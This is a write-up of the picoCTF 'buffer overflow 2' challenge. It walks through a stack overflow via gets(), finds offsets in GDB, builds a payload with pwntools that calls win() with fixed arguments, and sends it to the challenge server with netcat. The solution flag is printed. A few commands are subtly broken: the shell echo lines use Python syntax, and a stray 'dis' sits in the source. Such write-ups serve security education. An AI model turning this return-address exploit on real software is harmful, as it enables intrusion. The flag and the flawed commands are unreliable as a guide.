# Writeup: buffer overflow 2

## Overview

This challenge involves exploiting a buffer overflow vulnerability to change the return address of a program to a specific function (`win`) and provide specific arguments to it.

## Analysis

### Code Overview

1. Main Function

The `main` function prompts user to input a string and proceeds to the `vuln` function:

```c
int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

2. Vuln Function 

The `vuln` function reads user input using `gets` function:

```c
void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}
```

3. Win Function 

The `win` function output a flag if `arg1` and `arg2` match specific values:

```c
void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

dis  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}
```

### Vulnerability

1. The use of `gets` function in the `vuln` function does not check bounds of the buffer, leading to buffer overflow vulnerability.

## Exploitation strategy

The goal is to exploit the buffer overflow to overwrite the return address and redirect the program flow to the win function, passing the correct arguments (`arg1` and `arg2`) to reveal the flag.

1. Determine the Offset to the Return Address.

2. Craft payload to reach `win` function.

3. Determine the offset of buffer to `arg1` and `arg2`.

4. Craft payload.

5. Exploit the program.

## Exploitation steps

1. Determine the offset of buffer to return address.

-  Run the program in GDB:

```terminal
$ gdb vuln
```

-  Create a string using `pattern create` command:

```terminal
gef➤  pattern create 300
[+] Generating a pattern of 300 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
```

-  Input the string into the program and observe the crash:

```terminal
gef➤  run
Please enter your string: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaacgef
```

-  Inspect the value of `$eip`:

```terminal
$eip   : 0x62616164 ("daab"?)
```

-  Determine the offset using `pattern offset` command:

```terminal
gef➤  pattern offset $eip
[+] Searching for '64616162'/'62616164' with period=4
[+] Found at offset 112 (little-endian search) likely
```

- The offset to the return address is 112

2. Craft payload to reach `win` function.

- Determine the address of `win` function using `disas win` command:

```terminal
gef➤  disas win
Dump of assembler code for function win:
   0x08049296 <+0>:     endbr32
   0x0804929a <+4>:     push   ebp
   0x0804929b <+5>:     mov    ebp,esp
   0x0804929d <+7>:     push   ebx
   0x0804929e <+8>:     sub    esp,0x54
   0x080492a1 <+11>:    call   0x80491d0 <__x86.get_pc_thunk.bx>
   0x080492a6 <+16>:    add    ebx,0x2d5a
   0x080492ac <+22>:    sub    esp,0x8
   0x080492af <+25>:    lea    eax,[ebx-0x1ff8]
   0x080492b5 <+31>:    push   eax
   0x080492b6 <+32>:    lea    eax,[ebx-0x1ff6]
   0x080492bc <+38>:    push   eax
   0x080492bd <+39>:    call   0x8049160 <fopen@plt>
   0x080492c2 <+44>:    add    esp,0x10
   0x080492c5 <+47>:    mov    DWORD PTR [ebp-0xc],eax
   0x080492c8 <+50>:    cmp    DWORD PTR [ebp-0xc],0x0
   0x080492cc <+54>:    jne    0x80492f8 <win+98>
   0x080492ce <+56>:    sub    esp,0x4
   0x080492d1 <+59>:    lea    eax,[ebx-0x1fed]
   0x080492d7 <+65>:    push   eax
   0x080492d8 <+66>:    lea    eax,[ebx-0x1fd8]
   0x080492de <+72>:    push   eax
   0x080492df <+73>:    lea    eax,[ebx-0x1fa3]
   0x080492e5 <+79>:    push   eax
   0x080492e6 <+80>:    call   0x80490e0 <printf@plt>
   0x080492eb <+85>:    add    esp,0x10
   0x080492ee <+88>:    sub    esp,0xc
   0x080492f1 <+91>:    push   0x0
   0x080492f3 <+93>:    call   0x8049130 <exit@plt>
   0x080492f8 <+98>:    sub    esp,0x4
   0x080492fb <+101>:   push   DWORD PTR [ebp-0xc]
   0x080492fe <+104>:   push   0x40
   0x08049300 <+106>:   lea    eax,[ebp-0x4c]
   0x08049303 <+109>:   push   eax
   0x08049304 <+110>:   call   0x8049100 <fgets@plt>
   0x08049309 <+115>:   add    esp,0x10
   0x0804930c <+118>:   cmp    DWORD PTR [ebp+0x8],0xcafef00d
   0x08049313 <+125>:   jne    0x804932f <win+153>
   0x08049315 <+127>:   cmp    DWORD PTR [ebp+0xc],0xf00df00d
   0x0804931c <+134>:   jne    0x8049332 <win+156>
   0x0804931e <+136>:   sub    esp,0xc
   0x08049321 <+139>:   lea    eax,[ebp-0x4c]
   0x08049324 <+142>:   push   eax
   0x08049325 <+143>:   call   0x80490e0 <printf@plt>
   0x0804932a <+148>:   add    esp,0x10
   0x0804932d <+151>:   jmp    0x8049333 <win+157>
   0x0804932f <+153>:   nop
   0x08049330 <+154>:   jmp    0x8049333 <win+157>
   0x08049332 <+156>:   nop
   0x08049333 <+157>:   mov    ebx,DWORD PTR [ebp-0x4]
   0x08049336 <+160>:   leave
   0x08049337 <+161>:   ret
End of assembler dump.
```

- The address of `win` function is `0x0804929a`.

- Craft the payload using Python:

```terminal
$ python
>>> from pwn import *
>>> 'A'*112
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
>>> p32(0x0804929a)
b'\x9a\x92\x04\x08'
```

- Now our program is able to call the `win` function.

3. Determine the offset to `arg1` and `arg2`:

- Set a breakpoint at `0x0804930c <+118>:   cmp    DWORD PTR [ebp+0x8],0xcafef00d` in `win` function which comparing the value of `arg1`:

```
gef➤  break *0x0804930c
```

- Run the program with the payload crafted:

```terminal
gef➤  run <<< $(echo 'A'*112 + '\x9a\x92\x04\x08')
```

- Inspect the address of ebp+0x8 which is the address of `agr1`:

```terminal
gef➤  p $ebp+0x8
$2 = (void *) 0xffffcef4
```

- The address of `arg1` is `0xffffcef4`.

- Inspect the address of ebp+0xc which is the address of `arg2`:

```terminal
gef➤  p $ebp+0xc
$3 = (void *) 0xffffcef8
```

- The address of `arg2` is right after `arg1`.

- So now we just need to know the address of the buffer to get the offset.

- Set a break point right after the `gets` function in `vuln` function:

```terminal
gef➤  disas vuln
Dump of assembler code for function vuln:
   0x08049338 <+0>:     endbr32
   0x0804933c <+4>:     push   ebp
   0x0804933d <+5>:     mov    ebp,esp
   0x0804933f <+7>:     push   ebx
   0x08049340 <+8>:     sub    esp,0x74
   0x08049343 <+11>:    call   0x80491d0 <__x86.get_pc_thunk.bx>
   0x08049348 <+16>:    add    ebx,0x2cb8
   0x0804934e <+22>:    sub    esp,0xc
   0x08049351 <+25>:    lea    eax,[ebp-0x6c]
   0x08049354 <+28>:    push   eax
   0x08049355 <+29>:    call   0x80490f0 <gets@plt>
   0x0804935a <+34>:    add    esp,0x10
   0x0804935d <+37>:    sub    esp,0xc
   0x08049360 <+40>:    lea    eax,[ebp-0x6c]
   0x08049363 <+43>:    push   eax
   0x08049364 <+44>:    call   0x8049120 <puts@plt>
   0x08049369 <+49>:    add    esp,0x10
   0x0804936c <+52>:    nop
   0x0804936d <+53>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x08049370 <+56>:    leave
   0x08049371 <+57>:    ret
End of assembler dump.
gef➤  b *0x08049355
Breakpoint 2 at 0x804935a
```

- Run the program and inspect the stack to get the address of buffer:

```terminal
gef➤  run
gef➤  tele
0xffffce60│+0x0000: 0xffffce7c  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"     ← $esp
0xffffce64│+0x0004: 0x0000001a
0xffffce68│+0x0008: 0xf7e24d40  →  0xfbad2887
0xffffce6c│+0x000c: 0x08049348  →  <vuln+16> add ebx, 0x2cb8
0xffffce70│+0x0010: 0xf7e24d40  →  0xfbad2887
0xffffce74│+0x0014: 0xf7e24d87  →  0xe258a00a
0xffffce78│+0x0018: 0x00000001
0xffffce7c│+0x001c: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffce80│+0x0020: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffce84│+0x0024: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
```

- The buffer start from the address `0xffffce7c`.

- Calculate the offset of the buffer by subtraction in Python:

```terminal
$ python
>>> 0xffffcef4-0xffffce7c
120
```

- The offset is 120.

4. Crafting payload:

Slightly conclude the information:

1. Offset of return address is 112 bytes.

2. Offset of `arg1` is 120 bytes. 

3. `arg1` is followed by `arg2`.

Thus, the payload consists of:

1. 112 bytes of padding.

2. 4 bytes of `win` function address (`0x0804929a`).

3. 4 bytes of padding.

4. 4 bytes of correct value of `arg1` (`0xCAFEF00D`).

5. 4 bytes of correct value of `arg2` (`0xF00DF00D`).

```terminal
>>> from pwn import *
>>> 'A'*112
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
>>> p32(0x0804929a)
>>> 'A'*4
'AAAA'
>>> p32(0xCAFEF00D)
b'\r\xf0\xfe\xca'
>>> p32(0xF00DF00D)
b'\r\xf0\r\xf0'
```

5. Exploit

```terminal
$ echo 'A'*112 + '\x9a\x92\x04\x08' + 'A'*4 + '\r\xf0\xfe\xca\r\xf0\r\xf0' | nc saturn.picoctf.net 51896
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAA���
picoCTF{argum3nt5_4_d4yZ_27ecbf40}
```

## Conclusion
The buffer overflow allowed us to overwrite the return address and pass specific arguments to the win function, successfully exploiting the vulnerability to retrieve the flag.

